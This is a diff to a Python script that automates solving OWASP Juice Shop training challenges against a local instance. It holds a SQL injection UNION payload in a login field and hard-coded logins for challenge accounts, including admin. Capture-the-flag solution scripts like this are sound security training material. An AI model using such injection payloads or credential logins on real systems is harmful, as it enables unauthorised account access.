@@ -2,7 +2,7 @@ url='http://localhost:3000' # Indicate the URL without '/' at the end
 # Open this URL before running the script
 import requests
 
-# ==== Nothing to do before ====
+# ==== No required action ====
 # ---- Confidential Document (Access a confidential document.)
 requests.get(url+'/ftp/acquisitions.md')
 # ---- Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)
@@ -34,3 +34,9 @@ requests.post(url+'/rest/user/login', data={'email':'J12934@juice-sh.op','passwo
 requests.post(url+'/rest/user/login', data={'email':'\' UNION SELECT * FROM (SELECT 15 as \'id\', \'\' as \'username\', \'acc0unt4nt@juice-sh.op\' as \'email\', \'12345\' as \'password\', \'accounting\' as \'role\', \'1.2.3.4\' as \'lastLoginIp\', \'default.svg\' as \'profileImage\', \'\' as \'totpSecret\', 1 as \'isActive\', \'1999-08-16 14:14:41.644 +00:00\' as \'createdAt\', \'1999-08-16 14:33:41.930 +00:00\' as \'updatedAt\', null as \'deletedAt\')--','password':'a'})
 # ---- Login Support Team (Log in with the support team's original user credentials without applying SQL Injection or any other bypass.)
 requests.post(url+'/rest/user/login', data={'email':'support@juice-sh.op','password':'J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P'})
+
+# ==== Require to log in (admin account) ===
+session=requests.Session()
+session.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'})
+# ---- Privacy Policy (Read our privacy policy.)
+session.get(url+'/assets/public/images/padding/81px.png')
